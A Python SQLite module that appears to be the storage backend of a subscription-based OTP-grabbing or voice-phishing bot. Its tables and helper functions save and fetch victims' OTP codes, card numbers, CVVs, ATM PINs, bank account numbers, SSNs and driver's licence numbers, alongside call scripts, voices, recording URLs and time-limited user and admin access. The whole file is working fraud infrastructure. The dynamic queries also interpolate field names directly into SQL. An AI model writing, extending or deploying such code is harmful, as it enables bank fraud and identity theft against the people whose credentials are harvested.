import sqlite3
from datetime import datetime, date, timedelta
from typing import Optional, Union, List, Tuple

class Database:
    def __init__(self, path='UserDetails.db'):
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self.c = self.conn.cursor()
        self._init_tables()
    
    def _init_tables(self):
        """Create tables with optimized schema"""
        self.c.execute("""
            CREATE TABLE IF NOT EXISTS UserData (
                user_id INTEGER PRIMARY KEY,
                bank_name TEXT DEFAULT 'Notavailable',
                phone_no TEXT DEFAULT 'Notavailable',
                otp_code INTEGER DEFAULT 0,
                Recording_url TEXT DEFAULT 'Notavailable',
                card_number TEXT DEFAULT '0',
                card_cvv TEXT DEFAULT '0',
                card_expiry TEXT DEFAULT '0',
                account_number TEXT DEFAULT '0',
                atm_pin TEXT DEFAULT '0',
                expiry_date DATE,
                option1 TEXT DEFAULT 'Notavailable',
                option2 TEXT DEFAULT 'Notavailable',
                option3 TEXT DEFAULT 'Notavailable',
                option4 TEXT DEFAULT 'Notavailable',
                option_number TEXT DEFAULT 'Notavailable',
                numbers_collected1 TEXT DEFAULT 'Notavailable',
                numbers_collected2 TEXT DEFAULT 'Notavailable',
                voice TEXT DEFAULT 'Notavailable',
                dl_number TEXT DEFAULT 'Notavailable',
                ssn_number TEXT DEFAULT 'Notavailable',
                app_number TEXT DEFAULT 'Notavailable',
                script TEXT DEFAULT 'Notavailable'
            )""")
        
        self.c.execute("""
            CREATE TABLE IF NOT EXISTS Admindata (
                admin_id INTEGER PRIMARY KEY
            )""")
        
        self.c.execute("""
            CREATE TABLE IF NOT EXISTS Smsmode (
                user_id INTEGER PRIMARY KEY
            )""")
        self.conn.commit()
    
    # ========== USER MANAGEMENT ==========
    def create_user(self, userid: int, days: int = 365) -> bool:
        """Create user with expiry days (2,7,30,84,365)"""
        expiry_date = date.today() + timedelta(days=days)
        try:
            self.c.execute("""
                INSERT OR REPLACE INTO UserData 
                (user_id, expiry_date) VALUES (?, ?)
            """, (userid, expiry_date))
            self.conn.commit()
            return True
        except:
            return False
    
    def create_admin(self, adminid: int) -> bool:
        """Add admin"""
        try:
            self.c.execute("INSERT OR IGNORE INTO Admindata VALUES (?)", (adminid,))
            self.conn.commit()
            return True
        except:
            return False
    
    # ========== GENERIC SAVE/UPDATE ==========
    def save_data(self, userid: int, **kwargs) -> bool:
        """Save any user data dynamically"""
        if not kwargs:
            return False
        
        try:
            for field, value in kwargs.items():
                self.c.execute(f"""
                    UPDATE UserData SET {field} = ? WHERE user_id = ?
                """, (value, userid))
            self.conn.commit()
            return True
        except:
            return False
    
    # ========== GENERIC FETCH ==========
    def fetch_data(self, userid: int, *fields) -> Union[dict, any]:
        """Fetch user data - single field or multiple"""
        if not fields:
            fields = ('*',)
        
        try:
            query = f"SELECT {','.join(fields)} FROM UserData WHERE user_id = ?"
            self.c.execute(query, (userid,))
            result = self.c.fetchone()
            
            if len(fields) == 1 and fields[0] != '*':
                return result[0] if result else None
            return dict(zip(fields, result)) if result else {}
        except:
            return None if len(fields) == 1 else {}
    
    # ========== SPECIALIZED FETCHERS (for convenience) ==========
    def fetch_phonenumber(self, userid: int) -> str:
        return self.fetch_data(userid, 'phone_no') or 'Notavailable'
    
    def fetch_bankname(self, userid: int) -> str:
        return self.fetch_data(userid, 'bank_name') or 'Notavailable'
    
    def fetch_expiry_date(self, userid: int) -> Optional[date]:
        exp_str = self.fetch_data(userid, 'expiry_date')
        return datetime.strptime(exp_str, '%Y-%m-%d').date() if exp_str else None
    
    # ========== CHECK FUNCTIONS ==========
    def check_admin(self, userid: int) -> bool:
        self.c.execute("SELECT 1 FROM Admindata WHERE admin_id = ?", (userid,))
        return bool(self.c.fetchone())
    
    def check_user(self, userid: int) -> bool:
        self.c.execute("SELECT 1 FROM UserData WHERE user_id = ?", (userid,))
        return bool(self.c.fetchone())
    
    def check_expiry_days(self, userid: int) -> int:
        exp_date = self.fetch_expiry_date(userid)
        return (exp_date - date.today()).days if exp_date else -1
    
    def fetch_sms_userid(self, phone_no: str) -> Optional[int]:
        self.c.execute("SELECT user_id FROM UserData WHERE phone_no = ?", (phone_no,))
        result = self.c.fetchone()
        return result[0] if result else None
    
    # ========== DELETE OPERATIONS ==========
    def delete_user(self, userid: int) -> bool:
        try:
            self.c.execute("DELETE FROM UserData WHERE user_id = ?", (userid,))
            self.conn.commit()
            return True
        except:
            return False
    
    def delete_admin(self, adminid: int) -> bool:
        try:
            self.c.execute("DELETE FROM Admindata WHERE admin_id = ?", (adminid,))
            self.conn.commit()
            return True
        except:
            return False
    
    # ========== BULK FETCH ==========
    def get_all_users(self) -> List[int]:
        self.c.execute("SELECT user_id FROM UserData")
        return [row[0] for row in self.c.fetchall()]
    
    def get_all_admins(self) -> List[int]:
        self.c.execute("SELECT admin_id FROM Admindata")
        return [row[0] for row in self.c.fetchall()]
    
    def close(self):
        """Close database connection"""
        self.conn.close()

# ========== COMPATIBILITY WRAPPERS ==========
# For backward compatibility with existing code
db = Database()

# Old function names for drop-in replacement
def save_phonenumber(phone_no, userid):
    return db.save_data(userid, phone_no=phone_no)

def save_bankName(bank_name, userid):
    return db.save_data(userid, bank_name=bank_name)

def save_otpcode(otp_code, userid):
    return db.save_data(userid, otp_code=otp_code)

def save_cardnumber(card_number, userid):
    return db.save_data(userid, card_number=card_number)

def save_cardcvv(card_cvv, userid):
    return db.save_data(userid, card_cvv=card_cvv)

def save_cardexpiry(card_expiry, userid):
    return db.save_data(userid, card_expiry=card_expiry)

def save_accountnumber(account_number, userid):
    return db.save_data(userid, account_number=account_number)

def save_atmpin(atm_pin, userid):
    return db.save_data(userid, atm_pin=atm_pin)

def save_option1(option1, userid):
    return db.save_data(userid, option1=option1)

def save_option2(option2, userid):
    return db.save_data(userid, option2=option2)

def save_script(script, userid):
    return db.save_data(userid, script=script)

def save_option_number(option_number, userid):
    return db.save_data(userid, option_number=option_number)

def save_numbercollected1(numbers_collected1, userid):
    return db.save_data(userid, numbers_collected1=numbers_collected1)

def save_numbercollected2(numbers_collected2, userid):
    return db.save_data(userid, numbers_collected2=numbers_collected2)

def save_dlnumber(dlnumber, userid):
    return db.save_data(userid, dl_number=dlnumber)

def save_ssnumber(ssnumber, userid):
    return db.save_data(userid, ssn_number=ssnumber)

def save_applnumber(applnumber, userid):
    return db.save_data(userid, app_number=applnumber)

# Fetch functions
def fetch_phonenumber(userid):
    return db.fetch_phonenumber(userid)

def fetch_bankname(userid):
    return db.fetch_bankname(userid)

def fetch_otpcode(userid):
    return db.fetch_data(userid, 'otp_code')

def fetch_cardnumber(userid):
    return db.fetch_data(userid, 'card_number')

def fetch_cardcvv(userid):
    return db.fetch_data(userid, 'card_cvv')

def fetch_cardexpiry(userid):
    return db.fetch_data(userid, 'card_expiry')

def fetch_accountnumber(userid):
    return db.fetch_data(userid, 'account_number')

def fetch_atmpin(userid):
    return db.fetch_data(userid, 'atm_pin')

def fetch_expiry_date(userid):
    return db.fetch_expiry_date(userid)

def fetch_option1(userid):
    return db.fetch_data(userid, 'option1')

def fetch_option2(userid):
    return db.fetch_data(userid, 'option2')

def fetch_script(userid):
    return db.fetch_data(userid, 'script')

def fetch_option_number(userid):
    return db.fetch_data(userid, 'option_number')

def fetch_numbercollected1(userid):
    return db.fetch_data(userid, 'numbers_collected1')

def fetch_numbercollected2(userid):
    return db.fetch_data(userid, 'numbers_collected2')

def fetch_dlnumber(userid):
    return db.fetch_data(userid, 'dl_number')

def fetch_ssnumber(userid):
    return db.fetch_data(userid, 'ssn_number')

def fetch_applenumber(userid):
    return db.fetch_data(userid, 'app_number')

def check_admin(id):
    return db.check_admin(id)

def check_user(id):
    return db.check_user(id)

def check_expiry_days(id):
    return db.check_expiry_days(id)

def fetch_sms_userid(phone_no):
    return db.fetch_sms_userid(phone_no)

def create_user_test(userid):
    return db.create_user(userid, 2)

def create_user_7days(userid):
    return db.create_user(userid, 7)

def create_user_1month(userid):
    return db.create_user(userid, 30)

def create_user_3months(userid):
    return db.create_user(userid, 84)

def create_user_lifetime(userid):
    return db.create_user(userid, 365)

def delete_specific_UserData(userid):
    return db.delete_user(userid)

def delete_specific_AdminData(admin_id):
    return db.delete_admin(admin_id)